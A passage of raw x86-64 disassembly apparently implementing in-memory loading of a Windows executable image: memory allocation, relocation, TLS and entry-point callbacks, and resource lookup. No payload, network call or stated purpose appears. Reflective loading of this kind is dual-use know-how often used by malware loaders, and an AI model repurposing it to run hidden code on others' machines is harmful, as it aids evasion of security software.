    69dc2b5b:	48 85 c0             	test   %rax,%rax
    69dc2b5e:	49 89 c5             	mov    %rax,%r13
    69dc2b61:	0f 84 5b 02 00 00    	je     0x69dc2dc2
    69dc2b67:	31 db                	xor    %ebx,%ebx
    69dc2b69:	eb 4f                	jmp    0x69dc2bba
    69dc2b6b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc2b70:	b9 10 00 00 00       	mov    $0x10,%ecx
    69dc2b75:	e8 f6 21 00 00       	call   0x69dc4d70
    69dc2b7a:	48 85 c0             	test   %rax,%rax
    69dc2b7d:	49 89 c4             	mov    %rax,%r12
    69dc2b80:	0f 84 6c 02 00 00    	je     0x69dc2df2
    69dc2b86:	66 49 0f 6e cd       	movq   %r13,%xmm1
    69dc2b8b:	66 48 0f 6e c3       	movq   %rbx,%xmm0
    69dc2b90:	31 c9                	xor    %ecx,%ecx
    69dc2b92:	66 0f 6c c1          	punpcklqdq %xmm1,%xmm0
    69dc2b96:	41 b9 04 00 00 00    	mov    $0x4,%r9d
    69dc2b9c:	0f 11 00             	movups %xmm0,(%rax)
    69dc2b9f:	4c 89 f2             	mov    %r14,%rdx
    69dc2ba2:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
    69dc2ba8:	4c 89 e3             	mov    %r12,%rbx
    69dc2bab:	41 ff d7             	call   *%r15
    69dc2bae:	48 85 c0             	test   %rax,%rax
    69dc2bb1:	49 89 c5             	mov    %rax,%r13
    69dc2bb4:	0f 84 79 02 00 00    	je     0x69dc2e33
    69dc2bba:	4b 8d 44 35 00       	lea    0x0(%r13,%r14,1),%rax
    69dc2bbf:	4c 89 ea             	mov    %r13,%rdx
    69dc2bc2:	48 c1 ea 20          	shr    $0x20,%rdx
    69dc2bc6:	48 c1 e8 20          	shr    $0x20,%rax
    69dc2bca:	48 39 c2             	cmp    %rax,%rdx
    69dc2bcd:	72 a1                	jb     0x69dc2b70
    69dc2bcf:	ff 15 3f 97 00 00    	call   *0x973f(%rip)        # 0x69dcc314
    69dc2bd5:	41 b8 78 00 00 00    	mov    $0x78,%r8d
    69dc2bdb:	ba 08 00 00 00       	mov    $0x8,%edx
    69dc2be0:	48 89 c1             	mov    %rax,%rcx
    69dc2be3:	ff 15 4b 97 00 00    	call   *0x974b(%rip)        # 0x69dcc334
    69dc2be9:	48 85 c0             	test   %rax,%rax
    69dc2bec:	49 89 c4             	mov    %rax,%r12
    69dc2bef:	0f 84 d3 02 00 00    	je     0x69dc2ec8
    69dc2bf5:	4c 89 68 08          	mov    %r13,0x8(%rax)
    69dc2bf9:	0f b7 46 16          	movzwl 0x16(%rsi),%eax
    69dc2bfd:	48 8d 0d fc eb ff ff 	lea    -0x1404(%rip),%rcx        # 0x69dc1800
    69dc2c04:	66 48 0f 6e c1       	movq   %rcx,%xmm0
    69dc2c09:	49 89 5c 24 70       	mov    %rbx,0x70(%r12)
    69dc2c0e:	49 c7 44 24 58 00 00 	movq   $0x0,0x58(%r12)
    69dc2c15:	00 00 
    69dc2c17:	48 8d 0d 02 ec ff ff 	lea    -0x13fe(%rip),%rcx        # 0x69dc1820
    69dc2c1e:	66 c1 e8 0d          	shr    $0xd,%ax
    69dc2c22:	83 e0 01             	and    $0x1,%eax
    69dc2c25:	41 89 44 24 20       	mov    %eax,0x20(%r12)
    69dc2c2a:	48 8d 05 df eb ff ff 	lea    -0x1421(%rip),%rax        # 0x69dc1810
    69dc2c31:	66 48 0f 6e d0       	movq   %rax,%xmm2
    69dc2c36:	48 8d 05 f3 eb ff ff 	lea    -0x140d(%rip),%rax        # 0x69dc1830
    69dc2c3d:	66 0f 6c c2          	punpcklqdq %xmm2,%xmm0
    69dc2c41:	41 0f 11 44 24 28    	movups %xmm0,0x28(%r12)
    69dc2c47:	66 48 0f 6e c1       	movq   %rcx,%xmm0
    69dc2c4c:	66 48 0f 6e d8       	movq   %rax,%xmm3
    69dc2c51:	66 0f 6c c3          	punpcklqdq %xmm3,%xmm0
    69dc2c55:	48 8d 05 e4 eb ff ff 	lea    -0x141c(%rip),%rax        # 0x69dc1840
    69dc2c5c:	41 0f 11 44 24 38    	movups %xmm0,0x38(%r12)
    69dc2c62:	8b 56 54             	mov    0x54(%rsi),%edx
    69dc2c65:	49 89 44 24 48       	mov    %rax,0x48(%r12)
    69dc2c6a:	8b 44 24 24          	mov    0x24(%rsp),%eax
    69dc2c6e:	48 39 d5             	cmp    %rdx,%rbp
    69dc2c71:	41 89 44 24 68       	mov    %eax,0x68(%r12)
    69dc2c76:	0f 82 f4 01 00 00    	jb     0x69dc2e70
    69dc2c7c:	41 b9 04 00 00 00    	mov    $0x4,%r9d
    69dc2c82:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
    69dc2c88:	4c 89 e9             	mov    %r13,%rcx
    69dc2c8b:	41 ff d7             	call   *%r15
    69dc2c8e:	44 8b 46 54          	mov    0x54(%rsi),%r8d
    69dc2c92:	48 89 fa             	mov    %rdi,%rdx
    69dc2c95:	48 89 c1             	mov    %rax,%rcx
    69dc2c98:	e8 c3 20 00 00       	call   0x69dc4d60
    69dc2c9d:	4c 8d 46 38          	lea    0x38(%rsi),%r8
    69dc2ca1:	48 89 ea             	mov    %rbp,%rdx
    69dc2ca4:	48 89 f9             	mov    %rdi,%rcx
    69dc2ca7:	49 89 c1             	mov    %rax,%r9
    69dc2caa:	48 63 47 3c          	movslq 0x3c(%rdi),%rax
    69dc2cae:	49 01 c1             	add    %rax,%r9
    69dc2cb1:	4d 89 0c 24          	mov    %r9,(%r12)
    69dc2cb5:	4d 89 69 30          	mov    %r13,0x30(%r9)
    69dc2cb9:	4d 89 e1             	mov    %r12,%r9
    69dc2cbc:	e8 1f f0 ff ff       	call   0x69dc1ce0
    69dc2cc1:	85 c0                	test   %eax,%eax
    69dc2cc3:	0f 84 b2 01 00 00    	je     0x69dc2e7b
    69dc2cc9:	49 8b 0c 24          	mov    (%r12),%rcx
    69dc2ccd:	4c 8b 41 30          	mov    0x30(%rcx),%r8
    69dc2cd1:	4c 2b 46 30          	sub    0x30(%rsi),%r8
    69dc2cd5:	0f 85 b5 01 00 00    	jne    0x69dc2e90
    69dc2cdb:	41 c7 44 24 24 01 00 	movl   $0x1,0x24(%r12)
    69dc2ce2:	00 00 
    69dc2ce4:	4c 89 e1             	mov    %r12,%rcx
    69dc2ce7:	e8 64 eb ff ff       	call   0x69dc1850
    69dc2cec:	85 c0                	test   %eax,%eax
    69dc2cee:	0f 84 87 01 00 00    	je     0x69dc2e7b
    69dc2cf4:	4c 89 e1             	mov    %r12,%rcx
    69dc2cf7:	e8 04 f1 ff ff       	call   0x69dc1e00
    69dc2cfc:	85 c0                	test   %eax,%eax
    69dc2cfe:	0f 84 77 01 00 00    	je     0x69dc2e7b
    69dc2d04:	49 8b 14 24          	mov    (%r12),%rdx
    69dc2d08:	8b 82 d0 00 00 00    	mov    0xd0(%rdx),%eax
    69dc2d0e:	85 c0                	test   %eax,%eax
    69dc2d10:	74 3b                	je     0x69dc2d4d
    69dc2d12:	49 8b 74 24 08       	mov    0x8(%r12),%rsi
    69dc2d17:	48 8b 5c 06 18       	mov    0x18(%rsi,%rax,1),%rbx
    69dc2d1c:	48 85 db             	test   %rbx,%rbx
    69dc2d1f:	74 2c                	je     0x69dc2d4d
    69dc2d21:	48 8b 03             	mov    (%rbx),%rax
    69dc2d24:	48 85 c0             	test   %rax,%rax
    69dc2d27:	74 24                	je     0x69dc2d4d
    69dc2d29:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
    69dc2d30:	48 83 c3 08          	add    $0x8,%rbx
    69dc2d34:	45 31 c0             	xor    %r8d,%r8d
    69dc2d37:	ba 01 00 00 00       	mov    $0x1,%edx
    69dc2d3c:	48 89 f1             	mov    %rsi,%rcx
    69dc2d3f:	ff d0                	call   *%rax
    69dc2d41:	48 8b 03             	mov    (%rbx),%rax
    69dc2d44:	48 85 c0             	test   %rax,%rax
    69dc2d47:	75 e7                	jne    0x69dc2d30
    69dc2d49:	49 8b 14 24          	mov    (%r12),%rdx
    69dc2d4d:	8b 42 28             	mov    0x28(%rdx),%eax
    69dc2d50:	85 c0                	test   %eax,%eax
    69dc2d52:	0f 84 58 01 00 00    	je     0x69dc2eb0
    69dc2d58:	41 8b 54 24 20       	mov    0x20(%r12),%edx
    69dc2d5d:	4c 01 e8             	add    %r13,%rax
    69dc2d60:	85 d2                	test   %edx,%edx
    69dc2d62:	0f 84 56 01 00 00    	je     0x69dc2ebe
    69dc2d68:	45 31 c0             	xor    %r8d,%r8d
    69dc2d6b:	ba 01 00 00 00       	mov    $0x1,%edx
    69dc2d70:	4c 89 e9             	mov    %r13,%rcx
    69dc2d73:	ff d0                	call   *%rax
    69dc2d75:	85 c0                	test   %eax,%eax
    69dc2d77:	0f 84 8e 01 00 00    	je     0x69dc2f0b
    69dc2d7d:	41 c7 44 24 1c 01 00 	movl   $0x1,0x1c(%r12)
    69dc2d84:	00 00 
    69dc2d86:	eb 16                	jmp    0x69dc2d9e
    69dc2d88:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    69dc2d8f:	00 
    69dc2d90:	b9 c1 00 00 00       	mov    $0xc1,%ecx
    69dc2d95:	45 31 e4             	xor    %r12d,%r12d
    69dc2d98:	ff 15 f6 95 00 00    	call   *0x95f6(%rip)        # 0x69dcc394
    69dc2d9e:	4c 89 e0             	mov    %r12,%rax
    69dc2da1:	48 83 c4 58          	add    $0x58,%rsp
    69dc2da5:	5b                   	pop    %rbx
    69dc2da6:	5e                   	pop    %rsi
    69dc2da7:	5f                   	pop    %rdi
    69dc2da8:	5d                   	pop    %rbp
    69dc2da9:	41 5c                	pop    %r12
    69dc2dab:	41 5d                	pop    %r13
    69dc2dad:	41 5e                	pop    %r14
    69dc2daf:	41 5f                	pop    %r15
    69dc2db1:	c3                   	ret
    69dc2db2:	b9 0d 00 00 00       	mov    $0xd,%ecx
    69dc2db7:	45 31 e4             	xor    %r12d,%r12d
    69dc2dba:	ff 15 d4 95 00 00    	call   *0x95d4(%rip)        # 0x69dcc394
    69dc2dc0:	eb dc                	jmp    0x69dc2d9e
    69dc2dc2:	31 c9                	xor    %ecx,%ecx
    69dc2dc4:	41 b9 04 00 00 00    	mov    $0x4,%r9d
    69dc2dca:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
    69dc2dd0:	4c 89 f2             	mov    %r14,%rdx
    69dc2dd3:	41 ff d7             	call   *%r15
    69dc2dd6:	48 85 c0             	test   %rax,%rax
    69dc2dd9:	49 89 c5             	mov    %rax,%r13
    69dc2ddc:	0f 85 85 fd ff ff    	jne    0x69dc2b67
    69dc2de2:	b9 0e 00 00 00       	mov    $0xe,%ecx
    69dc2de7:	45 31 e4             	xor    %r12d,%r12d
    69dc2dea:	ff 15 a4 95 00 00    	call   *0x95a4(%rip)        # 0x69dcc394
    69dc2df0:	eb ac                	jmp    0x69dc2d9e
    69dc2df2:	31 d2                	xor    %edx,%edx
    69dc2df4:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
    69dc2dfa:	4c 89 e9             	mov    %r13,%rcx
    69dc2dfd:	48 8b 35 c8 95 00 00 	mov    0x95c8(%rip),%rsi        # 0x69dcc3cc
    69dc2e04:	ff d6                	call   *%rsi
    69dc2e06:	48 85 db             	test   %rbx,%rbx
    69dc2e09:	74 d7                	je     0x69dc2de2
    69dc2e0b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc2e10:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
    69dc2e14:	31 d2                	xor    %edx,%edx
    69dc2e16:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
    69dc2e1c:	ff d6                	call   *%rsi
    69dc2e1e:	48 8b 3b             	mov    (%rbx),%rdi
    69dc2e21:	48 89 d9             	mov    %rbx,%rcx
    69dc2e24:	e8 5f 1f 00 00       	call   0x69dc4d88
    69dc2e29:	48 85 ff             	test   %rdi,%rdi
    69dc2e2c:	48 89 fb             	mov    %rdi,%rbx
    69dc2e2f:	75 df                	jne    0x69dc2e10
    69dc2e31:	eb af                	jmp    0x69dc2de2
    69dc2e33:	48 8b 35 92 95 00 00 	mov    0x9592(%rip),%rsi        # 0x69dcc3cc
    69dc2e3a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    69dc2e40:	49 8b 4c 24 08       	mov    0x8(%r12),%rcx
    69dc2e45:	31 d2                	xor    %edx,%edx
    69dc2e47:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
    69dc2e4d:	ff d6                	call   *%rsi
    69dc2e4f:	49 8b 1c 24          	mov    (%r12),%rbx
    69dc2e53:	4c 89 e1             	mov    %r12,%rcx
    69dc2e56:	e8 2d 1f 00 00       	call   0x69dc4d88
    69dc2e5b:	48 85 db             	test   %rbx,%rbx
    69dc2e5e:	49 89 dc             	mov    %rbx,%r12
    69dc2e61:	75 dd                	jne    0x69dc2e40
    69dc2e63:	e9 7a ff ff ff       	jmp    0x69dc2de2
    69dc2e68:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    69dc2e6f:	00 
    69dc2e70:	b9 0d 00 00 00       	mov    $0xd,%ecx
    69dc2e75:	ff 15 19 95 00 00    	call   *0x9519(%rip)        # 0x69dcc394
    69dc2e7b:	4c 89 e1             	mov    %r12,%rcx
    69dc2e7e:	45 31 e4             	xor    %r12d,%r12d
    69dc2e81:	e8 ca f5 ff ff       	call   0x69dc2450
    69dc2e86:	e9 13 ff ff ff       	jmp    0x69dc2d9e
    69dc2e8b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc2e90:	49 8b 54 24 08       	mov    0x8(%r12),%rdx
    69dc2e95:	e8 96 ed ff ff       	call   0x69dc1c30
    69dc2e9a:	41 89 44 24 24       	mov    %eax,0x24(%r12)
    69dc2e9f:	e9 40 fe ff ff       	jmp    0x69dc2ce4
    69dc2ea4:	31 db                	xor    %ebx,%ebx
    69dc2ea6:	e9 64 fc ff ff       	jmp    0x69dc2b0f
    69dc2eab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc2eb0:	49 c7 44 24 60 00 00 	movq   $0x0,0x60(%r12)
    69dc2eb7:	00 00 
    69dc2eb9:	e9 e0 fe ff ff       	jmp    0x69dc2d9e
    69dc2ebe:	49 89 44 24 60       	mov    %rax,0x60(%r12)
    69dc2ec3:	e9 d6 fe ff ff       	jmp    0x69dc2d9e
    69dc2ec8:	31 d2                	xor    %edx,%edx
    69dc2eca:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
    69dc2ed0:	4c 89 e9             	mov    %r13,%rcx
    69dc2ed3:	48 8b 35 f2 94 00 00 	mov    0x94f2(%rip),%rsi        # 0x69dcc3cc
    69dc2eda:	ff d6                	call   *%rsi
    69dc2edc:	48 85 db             	test   %rbx,%rbx
    69dc2edf:	0f 84 fd fe ff ff    	je     0x69dc2de2
    69dc2ee5:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
    69dc2ee9:	31 d2                	xor    %edx,%edx
    69dc2eeb:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
    69dc2ef1:	ff d6                	call   *%rsi
    69dc2ef3:	48 8b 3b             	mov    (%rbx),%rdi
    69dc2ef6:	48 89 d9             	mov    %rbx,%rcx
    69dc2ef9:	e8 8a 1e 00 00       	call   0x69dc4d88
    69dc2efe:	48 85 ff             	test   %rdi,%rdi
    69dc2f01:	48 89 fb             	mov    %rdi,%rbx
    69dc2f04:	75 df                	jne    0x69dc2ee5
    69dc2f06:	e9 d7 fe ff ff       	jmp    0x69dc2de2
    69dc2f0b:	b9 5a 04 00 00       	mov    $0x45a,%ecx
    69dc2f10:	ff 15 7e 94 00 00    	call   *0x947e(%rip)        # 0x69dcc394
    69dc2f16:	e9 60 ff ff ff       	jmp    0x69dc2e7b
    69dc2f1b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69dc2f20:	48 85 c9             	test   %rcx,%rcx
    69dc2f23:	74 1c                	je     0x69dc2f41
    69dc2f25:	44 8b 41 20          	mov    0x20(%rcx),%r8d
    69dc2f29:	45 85 c0             	test   %r8d,%r8d
    69dc2f2c:	75 13                	jne    0x69dc2f41
    69dc2f2e:	48 8b 41 60          	mov    0x60(%rcx),%rax
    69dc2f32:	48 85 c0             	test   %rax,%rax
    69dc2f35:	74 0a                	je     0x69dc2f41
    69dc2f37:	8b 51 24             	mov    0x24(%rcx),%edx
    69dc2f3a:	85 d2                	test   %edx,%edx
    69dc2f3c:	74 03                	je     0x69dc2f41
    69dc2f3e:	48 ff e0             	rex.W jmp *%rax
    69dc2f41:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    69dc2f46:	c3                   	ret
    69dc2f47:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    69dc2f4e:	00 00 
    69dc2f50:	41 55                	push   %r13
    69dc2f52:	41 54                	push   %r12
    69dc2f54:	55                   	push   %rbp
    69dc2f55:	57                   	push   %rdi
    69dc2f56:	56                   	push   %rsi
    69dc2f57:	53                   	push   %rbx
    69dc2f58:	48 83 ec 28          	sub    $0x28,%rsp
    69dc2f5c:	48 8b 39             	mov    (%rcx),%rdi
    69dc2f5f:	48 8b 59 08          	mov    0x8(%rcx),%rbx
    69dc2f63:	8b 87 9c 00 00 00    	mov    0x9c(%rdi),%eax
    69dc2f69:	49 89 d4             	mov    %rdx,%r12
    69dc2f6c:	4d 89 c5             	mov    %r8,%r13
    69dc2f6f:	85 c0                	test   %eax,%eax
    69dc2f71:	0f 84 ba 00 00 00    	je     0x69dc3031
    69dc2f77:	ff 15 a7 93 00 00    	call   *0x93a7(%rip)        # 0x69dcc324
    69dc2f7d:	8b b7 98 00 00 00    	mov    0x98(%rdi),%esi
    69dc2f83:	4d 89 e8             	mov    %r13,%r8
    69dc2f86:	89 c5                	mov    %eax,%ebp
    69dc2f88:	48 01 de             	add    %rbx,%rsi
    69dc2f8b:	48 89 f2             	mov    %rsi,%rdx
    69dc2f8e:	48 89 f1             	mov    %rsi,%rcx
    69dc2f91:	e8 8a ea ff ff       	call   0x69dc1a20
    69dc2f96:	48 85 c0             	test   %rax,%rax
    69dc2f99:	0f 84 a1 00 00 00    	je     0x69dc3040
    69dc2f9f:	8b 50 04             	mov    0x4(%rax),%edx
    69dc2fa2:	4d 89 e0             	mov    %r12,%r8
    69dc2fa5:	48 89 f1             	mov    %rsi,%rcx
    69dc2fa8:	8b 87 98 00 00 00    	mov    0x98(%rdi),%eax
    69dc2fae:	81 e2 ff ff ff 7f    	and    $0x7fffffff,%edx
    69dc2fb4:	48 01 c2             	add    %rax,%rdx
    69dc2fb7:	48 01 da             	add    %rbx,%rdx
    69dc2fba:	e8 61 ea ff ff       	call   0x69dc1a20
    69dc2fbf:	48 85 c0             	test   %rax,%rax
    69dc2fc2:	0f 84 88 00 00 00    	je     0x69dc3050
    69dc2fc8:	44 8b 60 04          	mov    0x4(%rax),%r12d
    69dc2fcc:	44 0f b7 c5          	movzwl %bp,%r8d
    69dc2fd0:	48 89 f1             	mov    %rsi,%rcx
    69dc2fd3:	8b 87 98 00 00 00    	mov    0x98(%rdi),%eax
    69dc2fd9:	41 81 e4 ff ff ff 7f 	and    $0x7fffffff,%r12d
    69dc2fe0:	49 01 c4             	add    %rax,%r12
    69dc2fe3:	49 01 dc             	add    %rbx,%r12
    69dc2fe6:	4c 89 e2             	mov    %r12,%rdx
    69dc2fe9:	e8 32 ea ff ff       	call   0x69dc1a20
    69dc2fee:	48 85 c0             	test   %rax,%rax
    69dc2ff1:	74 21                	je     0x69dc3014
    69dc2ff3:	8b 40 04             	mov    0x4(%rax),%eax
    69dc2ff6:	8b 97 98 00 00 00    	mov    0x98(%rdi),%edx
    69dc2ffc:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
    69dc3001:	48 01 d0             	add    %rdx,%rax
    69dc3004:	48 01 d8             	add    %rbx,%rax
    69dc3007:	48 83 c4 28          	add    $0x28,%rsp
    69dc300b:	5b                   	pop    %rbx
    69dc300c:	5e                   	pop    %rsi
    69dc300d:	5f                   	pop    %rdi
    69dc300e:	5d                   	pop    %rbp
    69dc300f:	41 5c                	pop    %r12
    69dc3011:	41 5d                	pop    %r13
    69dc3013:	c3                   	ret
    69dc3014:	66 41 83 7c 24 0e 00 	cmpw   $0x0,0xe(%r12)
    69dc301b:	49 8d 44 24 10       	lea    0x10(%r12),%rax
    69dc3020:	75 d1                	jne    0x69dc2ff3
    69dc3022:	b9 17 07 00 00       	mov    $0x717,%ecx
    69dc3027:	ff 15 67 93 00 00    	call   *0x9367(%rip)        # 0x69dcc394
    69dc302d:	31 c0                	xor    %eax,%eax
    69dc302f:	eb d6                	jmp    0x69dc3007
    69dc3031:	b9 14 07 00 00       	mov    $0x714,%ecx
    69dc3036:	ff 15 58 93 00 00    	call   *0x9358(%rip)        # 0x69dcc394
    69dc303c:	31 c0                	xor    %eax,%eax
    69dc303e:	eb c7                	jmp    0x69dc3007
    69dc3040:	b9 15 07 00 00       	mov    $0x715,%ecx
    69dc3045:	ff 15 49 93 00 00    	call   *0x9349(%rip)        # 0x69dcc394
    69dc304b:	31 c0                	xor    %eax,%eax
    69dc304d:	eb b8                	jmp    0x69dc3007
    69dc304f:	90                   	nop
    69dc3050:	b9 16 07 00 00       	mov    $0x716,%ecx
    69dc3055:	ff 15 39 93 00 00    	call   *0x9339(%rip)        # 0x69dcc394
    69dc305b:	31 c0                	xor    %eax,%eax
    69dc305d:	eb a8                	jmp    0x69dc3007
    69dc305f:	90                   	nop
    69dc3060:	41 54                	push   %r12
    69dc3062:	55                   	push   %rbp
    69dc3063:	57                   	push   %rdi
    69dc3064:	56                   	push   %rsi
    69dc3065:	53                   	push   %rbx
    69dc3066:	48 83 ec 20          	sub    $0x20,%rsp
    69dc306a:	48 8b 39             	mov    (%rcx),%rdi
    69dc306d:	48 8b 59 08          	mov    0x8(%rcx),%rbx
    69dc3071:	8b 87 9c 00 00 00    	mov    0x9c(%rdi),%eax
    69dc3077:	49 89 d4             	mov    %rdx,%r12
    69dc307a:	44 89 cd             	mov    %r9d,%ebp
    69dc307d:	85 c0                	test   %eax,%eax
    69dc307f:	0f 84 db 00 00 00    	je     0x69dc3160
    69dc3085:	66 45 85 c9          	test   %r9w,%r9w
    69dc3089:	0f 84 91 00 00 00    	je     0x69dc3120
    69dc308f:	8b b7 98 00 00 00    	mov    0x98(%rdi),%esi
    69dc3095:	48 01 de             	add    %rbx,%rsi
    69dc3098:	48 89 f2             	mov    %rsi,%rdx
    69dc309b:	48 89 f1             	mov    %rsi,%rcx
    69dc309e:	e8 7d e9 ff ff       	call   0x69dc1a20
    69dc30a3:	48 85 c0             	test   %rax,%rax
    69dc30a6:	0f 84 c4 00 00 00    	je     0x69dc3170
    69dc30ac:	8b 50 04             	mov    0x4(%rax),%edx
    69dc30af:	4d 89 e0             	mov    %r12,%r8
    69dc30b2:	48 89 f1             	mov    %rsi,%rcx
    69dc30b5:	8b 87 98 00 00 00    	mov    0x98(%rdi),%eax
    69dc30bb:	81 e2 ff ff ff 7f    	and    $0x7fffffff,%edx
    69dc30c1:	48 01 c2             	add    %rax,%rdx
    69dc30c4:	48 01 da             	add    %rbx,%rdx
    69dc30c7:	e8 54 e9 ff ff       	call   0x69dc1a20
    69dc30cc:	48 85 c0             	test   %rax,%rax
    69dc30cf:	0f 84 ab 00 00 00    	je     0x69dc3180
    69dc30d5:	44 8b 60 04          	mov    0x4(%rax),%r12d
    69dc30d9:	44 0f b7 c5          	movzwl %bp,%r8d
    69dc30dd:	48 89 f1             	mov    %rsi,%rcx
    69dc30e0:	8b 87 98 00 00 00    	mov    0x98(%rdi),%eax
    69dc30e6:	41 81 e4 ff ff ff 7f 	and    $0x7fffffff,%r12d
    69dc30ed:	49 01 c4             	add    %rax,%r12
    69dc30f0:	49 01 dc             	add    %rbx,%r12
    69dc30f3:	4c 89 e2             	mov    %r12,%rdx
    69dc30f6:	e8 25 e9 ff ff       	call   0x69dc1a20
    69dc30fb:	48 85 c0             	test   %rax,%rax
    69dc30fe:	74 40                	je     0x69dc3140
    69dc3100:	8b 40 04             	mov    0x4(%rax),%eax
    69dc3103:	8b 97 98 00 00 00    	mov    0x98(%rdi),%edx
    69dc3109:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
    69dc310e:	48 01 d0             	add    %rdx,%rax
    69dc3111:	48 01 d8             	add    %rbx,%rax
    69dc3114:	48 83 c4 20          	add    $0x20,%rsp
    69dc3118:	5b                   	pop    %rbx
    69dc3119:	5e                   	pop    %rsi
    69dc311a:	5f                   	pop    %rdi
    69dc311b:	5d                   	pop    %rbp
    69dc311c:	41 5c                	pop    %r12
    69dc311e:	c3                   	ret
    69dc311f:	90                   	nop
    69dc3120:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
    69dc3125:	ff 15 f9 91 00 00    	call   *0x91f9(%rip)        # 0x69dcc324
    69dc312b:	4c 8b 44 24 60       	mov    0x60(%rsp),%r8
    69dc3130:	89 c5                	mov    %eax,%ebp
    69dc3132:	e9 58 ff ff ff       	jmp    0x69dc308f
    69dc3137:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    69dc313e:	00 00 
    69dc3140:	66 41 83 7c 24 0e 00 	cmpw   $0x0,0xe(%r12)
    69dc3147:	49 8d 44 24 10       	lea    0x10(%r12),%rax
    69dc314c:	75 b2                	jne    0x69dc3100
    69dc314e:	b9 17 07 00 00       	mov    $0x717,%ecx
    69dc3153:	ff 15 3b 92 00 00    	call   *0x923b(%rip)        # 0x69dcc394
    69dc3159:	31 c0                	xor    %eax,%eax
    69dc315b:	eb b7                	jmp    0x69dc3114
    69dc315d:	0f 1f 00             	nopl   (%rax)
    69dc3160:	b9 14 07 00 00       	mov    $0x714,%ecx
    69dc3165:	ff 15 29 92 00 00    	call   *0x9229(%rip)        # 0x69dcc394
    69dc316b:	31 c0                	xor    %eax,%eax
    69dc316d:	eb a5                	jmp    0x69dc3114
    69dc316f:	90                   	nop
    69dc3170:	b9 15 07 00 00       	mov    $0x715,%ecx
    69dc3175:	ff 15 19 92 00 00    	call   *0x9219(%rip)        # 0x69dcc394
    69dc317b:	31 c0                	xor    %eax,%eax
    69dc317d:	eb 95                	jmp    0x69dc3114
    69dc317f:	90                   	nop
    69dc3180:	b9 16 07 00 00       	mov    $0x716,%ecx
    69dc3185:	ff 15 09 92 00 00    	call   *0x9209(%rip)        # 0x69dcc394
    69dc318b:	31 c0                	xor    %eax,%eax
    69dc318d:	eb 85                	jmp    0x69dc3114
    69dc318f:	90                   	nop
    69dc3190:	48 85 d2             	test   %rdx,%rdx
    69dc3193:	74 0b                	je     0x69dc31a0
    69dc3195:	8b 42 04             	mov    0x4(%rdx),%eax
    69dc3198:	c3                   	ret
    69dc3199:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
    69dc31a0:	31 c0                	xor    %eax,%eax
    69dc31a2:	c3                   	ret
    69dc31a3:	0f 1f 00             	nopl   (%rax)
    69dc31a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc31ad:	00 00 00 
    69dc31b0:	48 8b 41 08          	mov    0x8(%rcx),%rax
    69dc31b4:	48 85 d2             	test   %rdx,%rdx
    69dc31b7:	74 07                	je     0x69dc31c0
    69dc31b9:	8b 12                	mov    (%rdx),%edx
    69dc31bb:	48 01 d0             	add    %rdx,%rax
    69dc31be:	c3                   	ret
    69dc31bf:	90                   	nop
    69dc31c0:	31 c0                	xor    %eax,%eax
    69dc31c2:	c3                   	ret
    69dc31c3:	0f 1f 00             	nopl   (%rax)
    69dc31c6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    69dc31cd:	00 00 00 
    69dc31d0:	55                   	push   %rbp
    69dc31d1:	57                   	push   %rdi
    69dc31d2:	56                   	push   %rsi
    69dc31d3:	53                   	push   %rbx
    69dc31d4:	48 83 ec 28          	sub    $0x28,%rsp
    69dc31d8:	45 85 c9             	test   %r9d,%r9d
    69dc31db:	48 89 cd             	mov    %rcx,%rbp
    69dc31de:	89 d3                	mov    %edx,%ebx
    69dc31e0:	4c 89 c7             	mov    %r8,%rdi
    69dc31e3:	44 89 ce             	mov    %r9d,%esi
    69dc31e6:	75 0b                	jne    0x69dc31f3
    69dc31e8:	89 f0                	mov    %esi,%eax
    69dc31ea:	48 83 c4 28          	add    $0x28,%rsp
    69dc31ee:	5b                   	pop    %rbx
    69dc31ef:	5e                   	pop    %rsi
    69dc31f0:	5f                   	pop    %rdi
    69dc31f1:	5d                   	pop    %rbp
    69dc31f2:	c3                   	ret
    69dc31f3:	c1 ea 04             	shr    $0x4,%edx
    69dc31f6:	45 31 c9             	xor    %r9d,%r9d
    69dc31f9:	41 b8 06 00 00 00    	mov    $0x6,%r8d
    69dc31ff:	83 c2 01             	add    $0x1,%edx
    69dc3202:	0f b7 d2             	movzwl %dx,%edx
    69dc3205:	e8 56 fe ff ff       	call   0x69dc3060
    69dc320a:	48 85 c0             	test   %rax,%rax
    69dc320d:	0f 84 2d 01 00 00    	je     0x69dc3340
    69dc3213:	8b 00                	mov    (%rax),%eax
    69dc3215:	48 03 45 08          	add    0x8(%rbp),%rax
    69dc3219:	83 e3 0f             	and    $0xf,%ebx
    69dc321c:	0f 84 de 00 00 00    	je     0x69dc3300
    69dc3222:	0f b7 08             	movzwl (%rax),%ecx
    69dc3225:	83 fb 01             	cmp    $0x1,%ebx
    69dc3228:	48 8d 44 48 02       	lea    0x2(%rax,%rcx,2),%rax
    69dc322d:	0f 84 cd 00 00 00    	je     0x69dc3300
    69dc3233:	0f b7 08             	movzwl (%rax),%ecx
